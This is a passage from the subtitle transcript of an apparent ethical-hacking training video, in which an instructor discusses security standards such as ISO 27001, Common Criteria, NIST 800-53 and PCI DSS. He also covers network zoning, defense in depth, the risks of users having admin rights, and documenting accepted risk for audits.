it.\n\n209\n00:10:20.290 --> 00:10:23.290\nWe should be able to create this,\nstandardize it, and\n\n210\n00:10:23.290 --> 00:10:26.240\ncommunicate it broadly\nthroughout the organization.\n\n211\n00:10:26.240 --> 00:10:28.738\nThere are international standards\nthat may help us to do this.\n\n212\n00:10:28.738 --> 00:10:30.398\nWe'll talk about some of them coming up.\n\n213\n00:10:30.398 --> 00:10:35.547\nBut things like ISO 27001, and ISO 27002.\n\n214\n00:10:35.547 --> 00:10:38.930\nFor instance, the ISO 27001 and\n\n215\n00:10:38.930 --> 00:10:43.591\n27002 standards, last revised in 2013.\n\n216\n00:10:43.591 --> 00:10:48.744\nSo you would see them listed as ISO\n27001 colon, 2013 for the year.\n\n217\n00:10:48.744 --> 00:10:52.945\nYou always see the year of reference with\nan ISO standard to signify the last time\n\n218\n00:10:52.945 --> 00:10:56.907\nthe standard was revised, and\nthe last publication date of the standard.\n\n219\n00:10:56.907 --> 00:11:01.612\nISO 27001 2013 deals with\nthe establishment of the ISMS,\n\n220\n00:11:01.612 --> 00:11:05.162\nthe Information Security\nManagement System, and\n\n221\n00:11:05.162 --> 00:11:10.793\nISO 27002 is the set of controls that\nare applied to the ISMS in 27001.\n\n222\n00:11:10.793 --> 00:11:14.543\nAllowing us to structure, build,\nand operate the ISMS throughout\n\n223\n00:11:14.543 --> 00:11:18.841\nthe organization, creating an enterprise\nsecurity architecture as we go.\n\n224\n00:11:18.841 --> 00:11:20.467\nSo it would be very important for\n\n225\n00:11:20.467 --> 00:11:23.630\nus to be able to understand\nhow to do something like this.\n\n226\n00:11:23.630 --> 00:11:29.200\nWe may use elements specified in ISO\n15408, the Common Criteria standard,\n\n227\n00:11:29.200 --> 00:11:33.570\nwhich allows us to go out and consume\ncertain information systems that have been\n\n228\n00:11:33.570 --> 00:11:37.730\ntested, and have been essentially profiled\nand specified to offer a certain level\n\n229\n00:11:37.730 --> 00:11:42.210\nof protection based on something\nknown as the assurance evaluation, or\n\n230\n00:11:42.210 --> 00:11:44.344\nthe Evaluation Assurance Level,\nI always get those backwards.\n\n231\n00:11:44.344 --> 00:11:47.810\nThe EAL, EAL5, for instance, right?\n\n232\n00:11:47.810 --> 00:11:53.190\nA certified system at EAL5 is gonna offer\nprotection higher than a level four or\n\n233\n00:11:53.190 --> 00:11:56.110\nlevel three system, but\nnot as high as level six or level seven.\n\n234\n00:11:56.110 --> 00:11:58.990\nThere are a total of seven levels\nin that protection scheme.\n\n235\n00:11:58.990 --> 00:12:01.970\nAnd so there's a lot of different moving\nparts that we may implement here.\n\n236\n00:12:01.970 --> 00:12:05.388\nFrom the international standard,\nif we are, from ISO perspective and\n\n237\n00:12:05.388 --> 00:12:09.730\nothers, if we're looking at\nguidance-specific to an organization, but\n\n238\n00:12:09.730 --> 00:12:11.510\nmaybe not at the level of ISO.\n\n239\n00:12:11.510 --> 00:12:13.870\nWe may look to an organization like NIST,\nand\n\n240\n00:12:13.870 --> 00:12:17.430\nmay find guidance there with some of\nthe recommendations that NIST provides.\n\n241\n00:12:17.430 --> 00:12:19.820\nNot recommendations\nare the legally binding, but\n\n242\n00:12:19.820 --> 00:12:24.010\nbest practice common sense recommendations\nthat could be integrated into\n\n243\n00:12:24.010 --> 00:12:27.580\nan Enterprise Information or\nEnterprise Security Architecture.\n\n244\n00:12:27.580 --> 00:12:30.770\nThings like standards for\nlogging, things like standards for\n\n245\n00:12:30.770 --> 00:12:35.220\npatch management, things like standards\nfor the application of encryption, and\n\n246\n00:12:35.220 --> 00:12:37.730\ncryptography protections\nto our organization.\n\n247\n00:12:37.730 --> 00:12:40.275\nThe use of secure encryption protocols or\n\n248\n00:12:40.275 --> 00:12:45.210\nencryption-oriented tunneling protocols\nto create security through VPN's.\n\n249\n00:12:45.210 --> 00:12:49.210\nThe use of the protections\nthat are offered or\n\n250\n00:12:49.210 --> 00:12:53.580\nthe controls that are offered in NIST\n800-53 R4, which are the control elements\n\n251\n00:12:53.580 --> 00:12:57.250\nassociated with the implementation of FIPS\nguide into the United States Government,\n\n252\n00:12:57.250 --> 00:13:00.120\nfor instance,\nFederal Information Processing Standards.\n\n253\n00:13:00.120 --> 00:13:02.220\nThere's all these\ndifferent ways we can go.\n\n254\n00:13:02.220 --> 00:13:04.290\nWe may not look to\ngovernmental recommendations.\n\n255\n00:13:04.290 --> 00:13:09.290\nThings like PCI DSS, which are again,\nstandards, they are called standards,\n\n256\n00:13:09.290 --> 00:13:10.790\nalthough they are not regulatory and\n\n257\n00:13:10.790 --> 00:13:15.740\nlegally binding at the same way that HIPAA\nstandards would be in the United States,\n\n258\n00:13:15.740 --> 00:13:20.705\nwhich are law and must be followed\nunder the direct penalty of legal\n\n259\n00:13:20.705 --> 00:13:24.760\nand/or financial and legal ramifications\nif you are found to be in violation.\n\n260\n00:13:24.760 --> 00:13:27.360\nYou and I were just talking about\nthis before we got started, right?\n\n261\n00:13:27.360 --> 00:13:31.180\nAnd PCI DSS is one of those areas\nthat a lot of people don't really\n\n262\n00:13:31.180 --> 00:13:32.350\nunderstand well.\n\n263\n00:13:32.350 --> 00:13:35.630\nThey think that it is a law that\nyou must follow this or else.\n\n264\n00:13:35.630 --> 00:13:41.044\nPCI DSS guidance is not a law, not in the\nUnited States, not anywhere in the world.\n\n265\n00:13:41.044 --> 00:13:45.069\nWhat it says is that it is\na collection of recommended,\n\n266\n00:13:45.069 --> 00:13:49.011\n12 in this case,\nin the current version 3.02.\n\n267\n00:13:49.011 --> 00:13:52.626\n12 implementation practices,\nthey are called standards,\n\n268\n00:13:52.626 --> 00:13:54.950\nthey are essentially guidelines.\n\n269\n00:13:54.950 --> 00:13:57.950\nThat anybody that wants to\nprocess electronic payments,\n\n270\n00:13:57.950 --> 00:14:01.440\ndeal with EDIFACT data,\nelectronic gateway transactions,\n\n271\n00:14:01.440 --> 00:14:03.710\nthings like that in the payment industry,\nand\n\n272\n00:14:03.710 --> 00:14:08.670\ndo electronic commerce, must align with\nand choose to voluntarily implement if\n\n273\n00:14:08.670 --> 00:14:13.200\nthey wanna process those systems or have\naccess to the electronic payment systems\n\n274\n00:14:13.200 --> 00:14:17.640\nthrough the common consortion of credit\ncard companies that are behind PC DSS.\n\n275\n00:14:17.640 --> 00:14:22.025\nSo if you wanna take and process\nMasterCard, Visa, American Express,\n\n276\n00:14:22.025 --> 00:14:26.760\netc, transactions, you must\nessentially follow those guidelines.\n\n277\n00:14:26.760 --> 00:14:29.940\nBut that's because they have, as an\nindustry come together, all those vendors,\n\n278\n00:14:29.940 --> 00:14:32.615\nand said this is how we want you to do it.\n\n279\n00:14:32.615 --> 00:14:36.505\nAnd if you're wanna use our systems,\nyou're gonna use our guidelines.\n\n280\n00:14:36.505 --> 00:14:39.245\nBut the federal government of the\nUnited States hasn't come out and said,\n\n281\n00:14:39.245 --> 00:14:42.765\nyeah, you gotta do PCI DSS or\nelse, it's a federal law.\n\n282\n00:14:42.765 --> 00:14:44.925\nQuite the opposite,\nthey have nothing to say about it.\n\n283\n00:14:44.925 --> 00:14:48.405\nIt's a trade group, attempt to be\nable to regulate their sector.\n\n284\n00:14:48.405 --> 00:14:51.495\nAnd it makes good, common sense, and\nit's a great set of standards, and\n\n285\n00:14:51.495 --> 00:14:56.510\nit makes a lot of businesses much more\nsafe with regards to processing your data.\n\n286\n00:14:56.510 --> 00:14:58.080\nBut, it's not a legal requirement.\n\n287\n00:14:58.080 --> 00:15:00.500\nAnd so there's all these different things,\nright?\n\n288\n00:15:00.500 --> 00:15:05.078\nThat go into the mix with regards to\nEnterprise Security Architecture.\n\n289\n00:15:05.078 --> 00:15:08.780\nAs a CEH, you would be expected to\nunderstand some of these things.\n\n290\n00:15:08.780 --> 00:15:11.385\nWe're gonna show you some websites\nwith some of these In just a minute.\n\n291\n00:15:11.385 --> 00:15:16.080\nBut we're gonna have you,\nas a CEH, be on the lead,\n\n292\n00:15:16.080 --> 00:15:19.230\nbe on the point, on the end of\nthe spear here, to be able to help\n\n293\n00:15:19.230 --> 00:15:23.910\na business understand how to be aligned,\nhow to implement secure guidance,\n\n294\n00:15:23.910 --> 00:15:27.570\nhow to create awareness among the people\nthat are gonna consume that knowledge.\n\n295\n00:15:27.570 --> 00:15:31.120\nBoth internal and external customers\nhave to be treated the same and\n\n296\n00:15:31.120 --> 00:15:35.180\nhave to be given the opportunity to\nbe able to access security awareness,\n\n297\n00:15:35.180 --> 00:15:38.370\ntraining, and\nfind information when necessary, right?\n\n298\n00:15:38.370 --> 00:15:40.850\nThese would all be elements\nof the kind of plan, or\n\n299\n00:15:40.850 --> 00:15:43.720\nthe kind of system that Mike\nmay suggest to put through.\n\n300\n00:15:43.720 --> 00:15:47.890\nWe have to think about performing risk\nassessments, we have to identify assets,\n\n301\n00:15:47.890 --> 00:15:51.610\nwe have to understand how to be\ncost effective in our protection.\n\n302\n00:15:51.610 --> 00:15:54.290\nSo we have to be dollar-aware,\nit's very important.\n\n303\n00:15:54.290 --> 00:15:55.624\nWe can't just go out and\n\n304\n00:15:55.624 --> 00:15:59.041\nsay buy the million dollar\nsystem to solve the $5 problem.\n\n305\n00:15:59.041 --> 00:16:02.807\nI mean, we may be able to, depending who\nwe work for, but it's not a good idea,\n\n306\n00:16:02.807 --> 00:16:06.478\ndoesn't make good sense, it's not\nexercising due diligence and due care.\n\n307\n00:16:06.478 --> 00:16:09.881\nTo be effectively spending money for\nno good reason.\n\n308\n00:16:09.881 --> 00:16:13.250\nThe reality is we have to be good\nstewards of the corporate resources.\n\n309\n00:16:13.250 --> 00:16:14.870\nThat's part of our job.\n\n310\n00:16:14.870 --> 00:16:17.330\nWe have to pay attention to all\nthe threats that are out there and\n\n311\n00:16:17.330 --> 00:16:20.005\nalign our protection\nmechanisms accordingly.\n\n312\n00:16:20.005 --> 00:16:23.155\nWe have to detect and\nrecover from security breaches.\n\n313\n00:16:23.155 --> 00:16:26.395\nWe have to go ahead and make sure\nwe are monitoring continuously and\n\n314\n00:16:26.395 --> 00:16:30.245\nassessing the state of our systems and\nthe ability for them to respond.\n\n315\n00:16:30.245 --> 00:16:33.425\nThis is all part of the enterprise\nsecurity architecture.\n\n316\n00:16:33.425 --> 00:16:37.055\nPart of the things that we need\nto build and we need to set up\n\n317\n00:16:37.055 --> 00:16:40.965\nas information security professionals,\nas CEH's in order to be able to do this.\n\n318\n00:16:40.965 --> 00:16:44.990\nWe have to think about using network\nzoning, the idea of creating\n\n319\n00:16:44.990 --> 00:16:49.650\nprotection enclaves and clearly carved\nout areas for certain kinds of behavior.\n\n320\n00:16:49.650 --> 00:16:53.260\nWe see this, for instance, with the use\nof a web browser like Internet Explorer\n\n321\n00:16:53.260 --> 00:16:56.270\nwhere we have the different security zones\n\n322\n00:16:56.270 --> 00:17:01.100\nthat are going to be able to [LAUGH],\nwe\n\n323\n00:17:01.100 --> 00:17:03.630\nsee the most darndest things in\nthe chat window from time to time.\n\n324\n00:17:03.630 --> 00:17:04.920\nI like that one a lot.\n\n325\n00:17:04.920 --> 00:17:08.260\nCrazy, stupid, nonsensical,\nnamed acronyms.\n\n326\n00:17:08.260 --> 00:17:09.490\nThat's awesome, I like that a lot.\n\n327\n00:17:09.490 --> 00:17:10.830\nAnd trademarked, that's even better.\n\n328\n00:17:10.830 --> 00:17:12.160\nThat's cool.\n\n329\n00:17:12.160 --> 00:17:15.670\nWe have to be thinking about the fact\nthat when you go in, can you pull up,\n\n330\n00:17:15.670 --> 00:17:20.270\nyou've got that crazy non-Windows\nbased browser on your computer, sir.\n\n331\n00:17:20.270 --> 00:17:21.910\n>> I do, I do.\n\n332\n00:17:21.910 --> 00:17:23.860\n>> You won't be able to see it though,\nwill you?\n\n333\n00:17:23.860 --> 00:17:26.160\nCuz you don't have the right thing.\n\n334\n00:17:26.160 --> 00:17:28.150\nCan we go to my lap PC, is that possible?\n\n335\n00:17:28.150 --> 00:17:30.780\nI know we said in theory\nthat that was going to work.\n\n336\n00:17:30.780 --> 00:17:31.748\nLook at that, that is so awesome.\n\n337\n00:17:31.748 --> 00:17:34.360\n>> [LAUGH]\n>> When we go in, and\n\n338\n00:17:34.360 --> 00:17:36.470\nlet me just pull up\nInternet Options here for a second.\n\n339\n00:17:36.470 --> 00:17:40.880\nJust give me a second to kinda smooth and\nmove that over there.\n\n340\n00:17:40.880 --> 00:17:45.330\nWhen we go in, and we go and\nwe take a look at Security.\n\n341\n00:17:45.330 --> 00:17:48.480\nIf we could maybe zoom in for\na second, is that possible?\n\n342\n00:17:48.480 --> 00:17:48.990\nThat's all me.\n\n343\n00:17:48.990 --> 00:17:52.170\nIsn't it awesome, thank you very much\nbecause I have no idea how to zoom in on\n\n344\n00:17:52.170 --> 00:17:55.280\nthis PC without blowing\neverything up in the process.\n\n345\n00:17:55.280 --> 00:17:58.790\nWhen you look at what I'm showing you\nhere, just a quick reference to this idea\n\n346\n00:17:58.790 --> 00:18:03.170\nof zoning, the use of zones, you can\nimplement this in a lot of different ways.\n\n347\n00:18:03.170 --> 00:18:07.010\nWe can have the internet zone,\nwe can have the non-internet zones,\n\n348\n00:18:07.010 --> 00:18:09.940\nwe can have the DMZ zone,\nwe can have internal-external,\n\n349\n00:18:09.940 --> 00:18:11.070\nall these different things.\n\n350\n00:18:11.070 --> 00:18:14.225\nBut in the Internet Explorer,\nat least in this piece of software,\n\n351\n00:18:14.225 --> 00:18:17.385\nwe can see that we implement\nthis exact thought process.\n\n352\n00:18:17.385 --> 00:18:21.575\nWe have the internet zone, we have the\nlocal intranet zone, we have the trusted\n\n353\n00:18:21.575 --> 00:18:26.475\nsites, restricted sites, we have\ndifferent ways of looking at process and\n\n354\n00:18:26.475 --> 00:18:29.512\nsystem isolation with regards to that and\n\n355\n00:18:29.512 --> 00:18:32.965\nwith regards to being able\nto apply that concept.\n\n356\n00:18:32.965 --> 00:18:36.365\nWe just want to be thinking\nabout the idea behind that and\n\n357\n00:18:36.365 --> 00:18:38.290\njust thinking about what\nthat may look like.\n\n358\n00:18:38.290 --> 00:18:41.920\nNetwork security can exist in lots\nof different places, in other words.\n\n359\n00:18:41.920 --> 00:18:44.370\nWe just wanna be thinking\nabout the zoning concept and\n\n360\n00:18:44.370 --> 00:18:47.010\nhow we can apply that as\na certified ethical hacker.\n\n361\n00:18:47.010 --> 00:18:50.420\nHow can we make recommendations about\nthe enterprise security architecture\n\n362\n00:18:50.420 --> 00:18:52.680\nthat help us to take advantage of this?\n\n363\n00:18:52.680 --> 00:18:55.360\nWeb services are definitely\none of those ways to do that.\n\n364\n00:18:55.360 --> 00:18:57.630\nNot the only way, by the way,\nbut certainly one of the ways.\n\n365\n00:18:57.630 --> 00:18:59.590\nWe can look at physical architecture,\n\n366\n00:18:59.590 --> 00:19:03.460\ncreating a DMZ as a physical\ndesign choice we make.\n\n367\n00:19:03.460 --> 00:19:06.820\nWe may implement it physically or\nlogically, or both.\n\n368\n00:19:06.820 --> 00:19:08.095\nWe just have to think about that,\n\n369\n00:19:08.095 --> 00:19:12.520\nit could be one machine with\nmultihomed systems, essentially.\n\n370\n00:19:12.520 --> 00:19:16.090\nYou got multiple network cards that\nlogically create connections to different\n\n371\n00:19:16.090 --> 00:19:17.720\nnetworks through one system.\n\n372\n00:19:18.900 --> 00:19:21.040\nWe could do that with subnets, with VLANs,\n\n373\n00:19:21.040 --> 00:19:24.660\nlots of different ways logically\nto isolate or physically isolate.\n\n374\n00:19:24.660 --> 00:19:27.930\nSo, we have different ways of doing this\nbut all of these comes back to the idea of\n\n375\n00:19:27.930 --> 00:19:30.050\ndefense in depth and\nwe've spoken about this before.\n\n376\n00:19:30.050 --> 00:19:33.860\nThis would also be part of what Mike was\ntalking about with his security awareness\n\n377\n00:19:33.860 --> 00:19:35.300\nand training program.\n\n378\n00:19:35.300 --> 00:19:39.510\nWe'd want to instill in everybody\na sense of defense in depth awareness.\n\n379\n00:19:39.510 --> 00:19:43.890\nNot that they as individual users have to\ngo out and build defense in depth systems.\n\n380\n00:19:43.890 --> 00:19:48.760\nThat's our job as protectors and\nas monitors and as owners and\n\n381\n00:19:48.760 --> 00:19:51.290\ncaretakers of the security apparatus and\n\n382\n00:19:51.290 --> 00:19:54.990\nthe essential guardians of\nthe enterprise security architecture.\n\n383\n00:19:54.990 --> 00:19:58.010\nBut we do have to make everybody\nwho uses those systems aware\n\n384\n00:19:58.010 --> 00:20:01.220\nof the fact that there\nare multiple layers of defense.\n\n385\n00:20:01.220 --> 00:20:05.450\nIn some of the demos we'll do in upcoming\nepisodes, we'll be on a Windows platform,\n\n386\n00:20:05.450 --> 00:20:07.230\non a Linux platform, whatever it is.\n\n387\n00:20:07.230 --> 00:20:11.620\nOn the Windows platform,\nwe'll perhaps shut down Windows Defender,\n\n388\n00:20:11.620 --> 00:20:15.397\nMicrosoft Security Essentials, so it\ndoesn't see a lot of the tools we're gonna\n\n389\n00:20:15.397 --> 00:20:17.710\nuse in demo for you as malware and\nhacking software.\n\n390\n00:20:17.710 --> 00:20:20.770\nWhich it could very well see them as,\nso that it doesn't take\n\n391\n00:20:20.770 --> 00:20:23.880\nremunerative steps to remove them\nbefore we can actually use them.\n\n392\n00:20:23.880 --> 00:20:26.720\nThat's a conscious choice we're\ngonna make in the environment\n\n393\n00:20:26.720 --> 00:20:30.360\nto essentially manipulate it, so\nwe can illustrate or show you something.\n\n394\n00:20:30.360 --> 00:20:32.830\nIn the real world,\nthere wouldn't be a compelling reason for\n\n395\n00:20:32.830 --> 00:20:35.480\nyou to give users the right\nto shut that software off.\n\n396\n00:20:35.480 --> 00:20:37.140\nThat would be a bad idea and\n\n397\n00:20:37.140 --> 00:20:40.810\nthat would something that from a defense\nin depth posture would make no sense.\n\n398\n00:20:40.810 --> 00:20:44.030\nYet, users have that right unless\nyou take it away from them.\n\n399\n00:20:44.030 --> 00:20:47.640\nCan we go back to the demo,\nthe lab machine here for just a minute?\n\n400\n00:20:47.640 --> 00:20:48.560\nThank you very much.\n\n401\n00:20:48.560 --> 00:20:56.380\nIt's not hard to do if you go in and\nyou go to the control panel.\n\n402\n00:20:56.380 --> 00:20:58.290\nThis is Windows 10, by the way.\n\n403\n00:20:58.290 --> 00:21:02.120\nYou go to System and\nSecurity, we'll just go here.\n\n404\n00:21:02.120 --> 00:21:06.670\nWe can go in and we can go, for instance,\nto the Windows Firewall, as I'm sure\n\n405\n00:21:06.670 --> 00:21:10.650\nyou're well aware and we can come in and\njust turn the Windows Firewall on or off.\n\n406\n00:21:10.650 --> 00:21:13.880\nIt's just simply putting\na little button in that,\n\n407\n00:21:13.880 --> 00:21:16.760\nor a little radio selection\nin that button right there.\n\n408\n00:21:16.760 --> 00:21:20.410\nIf we have Windows Defender or\nMicrosoft Security Central installed,\n\n409\n00:21:20.410 --> 00:21:25.670\nwe could turn it off very easily,\njust by going in and clicking on a button.\n\n410\n00:21:25.670 --> 00:21:28.980\nIt's not hard with\nadministrative rights to a PC\n\n411\n00:21:28.980 --> 00:21:31.300\nto up end the enterprise\nsecurity architecture.\n\n412\n00:21:31.300 --> 00:21:35.670\nAnd we have to keep in mind that\nunfortunately, in many of our systems,\n\n413\n00:21:35.670 --> 00:21:39.805\nwe give the average user full admin rights\nto the desktop, cuz we're too lazy,\n\n414\n00:21:39.805 --> 00:21:44.400\nand/or to uneducated,\nto understand how to install software, and\n\n415\n00:21:44.400 --> 00:21:46.960\ndeal with other issues,\nwithout giving them full admin rights.\n\n416\n00:21:46.960 --> 00:21:48.920\nAnd yes, I did say that.\n\n417\n00:21:48.920 --> 00:21:53.010\nYes, I am calling everybody out\nthere out who doesn't know better.\n\n418\n00:21:53.010 --> 00:21:57.180\nYou guys shouldn't do that and you know\nthat you're doing something wrong, yet\n\n419\n00:21:57.180 --> 00:21:59.000\nyou allow it to continue.\n\n420\n00:21:59.000 --> 00:22:01.660\nThis is the kind of ethical\nbehavior we're talking about.\n\n421\n00:22:01.660 --> 00:22:02.320\nDue care and\n\n422\n00:22:02.320 --> 00:22:05.970\ndue diligence is not just about making\nsure you're up to date with patches.\n\n423\n00:22:05.970 --> 00:22:10.880\nIt's about acting responsibly and\nacting ethically, and making sure,\n\n424\n00:22:10.880 --> 00:22:16.060\nat all times, that we're risk adverse and\nwe are risk aware in what we do.\n\n425\n00:22:16.060 --> 00:22:17.800\nI don't wanna stand up on my soap box,\n\n426\n00:22:17.800 --> 00:22:19.605\nalthough I would be taller\nthan Mike if I did.\n\n427\n00:22:19.605 --> 00:22:20.250\n>> [LAUGH]\n>> But\n\n428\n00:22:20.250 --> 00:22:25.280\nI just want you to know that ultimately,\nif you see this behavior occurring and you\n\n429\n00:22:25.280 --> 00:22:28.970\nallow it to propagate and continue in your\nnetworks, you're not building a defense in\n\n430\n00:22:28.970 --> 00:22:33.320\ndepth enterprise security architecture\nthat's focused on preventing attacks.\n\n431\n00:22:33.320 --> 00:22:37.300\nYou're opening up a major security hole\nand liability and acknowledging a risk and\n\n432\n00:22:37.300 --> 00:22:41.360\nignoring it in your architecture\nthat can propagate attacks.\n\n433\n00:22:41.360 --> 00:22:44.820\nThe vulnerability we want to\nidentify is escalation of privilege,\n\n434\n00:22:44.820 --> 00:22:47.760\nan oversubscription or\noveruse of administrative rights.\n\n435\n00:22:47.760 --> 00:22:52.850\nIf users can go in and derail security\npolicy by shutting off software\n\n436\n00:22:52.850 --> 00:22:56.410\nthat gets in their way, that's not a good\narchitecture as far as I'm concerned.\n\n437\n00:22:56.410 --> 00:22:59.970\nThat's an administrator error or\nadministrative error in oversight, and\n\n438\n00:22:59.970 --> 00:23:01.670\nthat's not something that should happen.\n\n439\n00:23:01.670 --> 00:23:05.010\nThere are compelling, legitimate reasons\nwhy you may need to do that, and\n\n440\n00:23:05.010 --> 00:23:05.800\nI'm not suggesting for\n\n441\n00:23:05.800 --> 00:23:11.310\na minute that there not cases where that\nmay be the only legitimate way to go.\n\n442\n00:23:11.310 --> 00:23:14.950\nBut you better then show me that you've\ndocumented that risk, that somebody above\n\n443\n00:23:14.950 --> 00:23:18.550\nyou in a position of senior management\nhas been acknowledging that risk.\n\n444\n00:23:18.550 --> 00:23:22.628\nHas signed off on it, in other words, and\ncommunicated effectively with them what\n\n445\n00:23:22.628 --> 00:23:26.531\nthe implications of that risk is and when\nI come to audit you and this is a question\n\n446\n00:23:26.531 --> 00:23:30.600\nI ask my customers all the time I audit,\nhey, you've got exceptions, great.\n\n447\n00:23:30.600 --> 00:23:31.420\nWhere are they?\n\n448\n00:23:31.420 --> 00:23:33.350\nLet me see them.\nCuz if I find them and\n\n449\n00:23:33.350 --> 00:23:36.330\nyou don't have them documented, I'm\nfailing you on your audit because they're\n\n450\n00:23:36.330 --> 00:23:39.900\nunacknowledged risks and you don't pass\nan audit with unacknowledged risks.\n\n451\n00:23:39.900 --> 00:23:42.030\nIf you have them,\nlet's be upfront about them.\n\n452\n00:23:42.030 --> 00:23:43.260\nTell me what they are.\n\n453\n00:23:43.260 --> 00:23:46.590\nI may not like them, I may tell you\nI think that they're inappropriate.\n\n454\n00:23:46.590 --> 00:23:50.062\nBut if you've got documentation that\nshows me you've identified them,\n\n455\n00:23:50.062 --> 00:23:52.694\nsomebody in senior management\nhas signed off on them and\n\n456\n00:23:52.694 --> 00:23:55.613\nyou're operating the business\nwith full knowledge, okay.\n\n457\n00:23:55.613 --> 00:23:59.356\nYou've done everything that I would want\nyou to do from a controls perspective,\n\n458\n00:23:59.356 --> 00:24:02.660\nshort of mitigating that risk by\napplying a compensating preventive or\n\n459\n00:24:02.660 --> 00:24:03.663\ndetective control.\n\n460\n00:24:03.663 --> 00:24:08.429\nBut you've documented it and you've told\nme that you're ignoring it, and one of\n\n461\n00:24:08.429 --> 00:24:12.984\nthe four legitimate ways to deal with\nrisk is either accept risk, which is what\n\n462\n00:24:12.984 --> 00:24:18.200\nyou're doing, to avoid it, to mitigate it,\nminimize it, and or to transfer it.\n\n463\n00:24:18.200 --> 00:24:21.600\nIf you're gonna accept it, then just make\nsure you've got all your ducks in a row.\n\n464\n00:24:21.600 --> 00:24:23.180\nAnd we may not like it, but guess what,\n\n465\n00:24:23.180 --> 00:24:25.930\nI don't have to sleep in your bed\nat night and worry about your risk.\n\n466\n00:24:25.930 --> 00:24:27.400\nI don't work for your company.\n\n467\n00:24:27.400 --> 00:24:30.220\nWhen it blows up, I'm not gonna\nbe the one who has to fix it, but\n\n468\n00:24:30.220 --> 00:24:33.620\nI am gonna be the one who's gonna say,\nwow, how did you let that happen,\n\n469\n00:24:33.620 --> 00:24:36.120\nif you don't have a documented\nrisk that you've accepted.\n\n470\n00:24:36.120 --> 00:24:38.750\nIf we accept it,\nI'm gonna be the one who says, yep, no,\n\n471\n00:24:38.750 --> 00:24:42.290\nwe knew that was an issue, understood\nthat it could happen, let's just go about\n\n472\n00:24:42.290 --> 00:24:46.230\nfixing it cuz we accepted the price of\ndoing business by accepting the risk.\n\n473\n00:24:46.230 --> 00:24:47.650\nIn other words, there's no I told you so.\n\n474\n00:24:47.650 --> 00:24:49.410\nWe're not looking to blame anybody.\n\n475\n00:24:49.410 --> 00:24:52.400\nWe're just looking to make sure the right\npeople said yes, so that when it\n\n476\n00:24:52.400 --> 00:24:57.520\ndoes happen, we understand that those\npeople knew that this was a possibility.\n\n477\n00:24:57.520 --> 00:24:59.140\nBecause then there\nshould not be any blame,\n\n478\n00:24:59.140 --> 00:25:02.760\nthere should simply be a remediation\nstrategy that has to go into effect.\n\n479\n00:25:02.760 --> 00:25:06.170\nIt's very important to think about that,\nright?\n\n480\n00:25:06.170 --> 00:25:07.290\nWe have a quick question.\n\n481\n00:25:07.290 --> 00:25:10.910\nCan you tell us if we to install the\nsoftware VM OSs for the rest of the week?\n\n482\n00:25:10.910 --> 00:25:11.410\nThanks.\n\n483\n00:25:12.690 --> 00:25:13.420\nAbsolutely.\n\n484\n00:25:13.420 --> 00:25:15.492\nWe could answer it, I thought it was\nactually a question related to what\n\n485\n00:25:15.492 --> 00:25:16.330\nwe were talking about here.\n\n486\n00:25:16.330 --> 00:25:19.600\nThere is no need, no need for any of\nyou out there listening to any of our\n\n487\n00:25:19.600 --> 00:25:23.740\nepisodes, by the way, with regards to CH,\nto install anything per se.\n\n488\n00:25:23.740 --> 00:25:25.560\nIf you want to, as we're doing demos,\n\n489\n00:25:25.560 --> 00:25:28.630\nas we will do in later episodes,\nfollow along.\n\n490\n00:25:28.630 --> 00:25:31.150\nWe'll always tell you what\nthe tool is that we're gonna use.\n\n491\n00:25:31.150 --> 00:25:33.880\nGive you a quick idea of what\nwe've done to set it up.\n\n492\n00:25:33.880 --> 00:25:36.610\nAt the beginning of that we'll kind of\ngive you a sense of where we went to build\n\n493\n00:25:36.610 --> 00:25:38.220\nthe VMs, or how we built them.\n\n494\n00:25:38.220 --> 00:25:40.950\nWe're gonna use some premade VMs\nthat we're going to use to demo.\n\n495\n00:25:40.950 --> 00:25:45.050\nOne will be a Kali Linux VM, we use\na couple of Windows VM's all networked\n\n496\n00:25:45.050 --> 00:25:48.270\ntogether, but you'll be able to\nsee us do stuff, but no reason for\n\n497\n00:25:48.270 --> 00:25:50.040\nyou to have to do\nanything to follow along.\n\n498\n00:25:50.040 --> 00:25:53.310\nWe'll describe what we're gonna do, and\nif you decide you want to reproduce that\n\n499\n00:25:53.310 --> 00:25:56.800\nenvironment, there will be some guidance\nalong the lines of just what to do and\n\n500\n00:25:56.800 --> 00:25:59.360\nhow we did it that you can access and\ndownload, but\n\n501\n00:25:59.360 --> 00:26:02.310\nwe'll tell you what tools we're using and\nwhere to find them if you're interested.\n\n502\n00:26:02.310 --> 00:26:05.890\nBut that'll be up to you, but nothing\nrequired from us other than that per se.\n\n503\n00:26:05.890 --> 00:26:07.638\nAt least nothing right now, anyway.\n\n504\n00:26:07.638 --> 00:26:11.719\nI may change my mind if Mike pisses me\noff, but for now we're not gonna not have\n\n505\n00:26:11.719 --> 00:26:14.875\nyou do anything, but we've talked\nabout the importance of policies and\n\n506\n00:26:14.875 --> 00:26:19.005\nthe different kinds of requirements that\npolicies speak to in the organization.\n\n507\n00:26:19.005 --> 00:26:23.655\nCan't stress enough just how important\npolicies are and why we need them.\n\n508\n00:26:23.655 --> 00:26:24.780\nWhat kind of policies?\n\n509\n00:26:24.780 --> 00:26:26.490\nPolicies for everything and anything.\n\n510\n00:26:26.490 --> 00:26:30.650\nWe may have access control policies,\nuser account policies, special access,\n\n511\n00:26:30.650 --> 00:26:32.650\nfirewall management, you name it.\n\n512\n00:26:32.650 --> 00:26:33.670\nThere's all sorts of policies.\n\n513\n00:26:33.670 --> 00:26:35.170\nCan you take us on a little road trip?\n\n514\n00:26:35.170 --> 00:26:36.070\n>> Absolutely.\n>> On the web.\n\n515\n00:26:36.070 --> 00:26:37.550\nThis is gonna be one we didn't plan for.\n\n516\n00:26:37.550 --> 00:26:40.220\nLet me just tell Mike where we're gonna\ngo before we switch to his machine,\n\n517\n00:26:40.220 --> 00:26:41.650\ngive him a second to bring this up.\n\n518\n00:26:41.650 --> 00:26:44.800\nCan you go to the SANS Reading Room and\nbring up the policy site, The one you and\n\n519\n00:26:44.800 --> 00:26:46.840\nI have been doing before\nwith all the templates?\n\n520\n00:26:46.840 --> 00:26:49.490\nWe'll give Mike just a second to\nget there before we demo that.\n\n521\n00:26:49.490 --> 00:26:52.390\nWhat we want to show you is\none of the places you can\n\n522\n00:26:52.390 --> 00:26:54.550\ngo to get policy templates\nif you need them.\n\n523\n00:26:54.550 --> 00:26:57.198\nOne of the biggest challenges\nwhen I was starting out\n\n524\n00:26:57.198 --> 00:27:00.206\nover 30 years ago now doing this,\nback in the 1980s,\n\n525\n00:27:00.206 --> 00:27:04.078\nbeen a long time, it's closer to 40\nyears now that I've been doing this.\n\n526\n00:27:04.078 --> 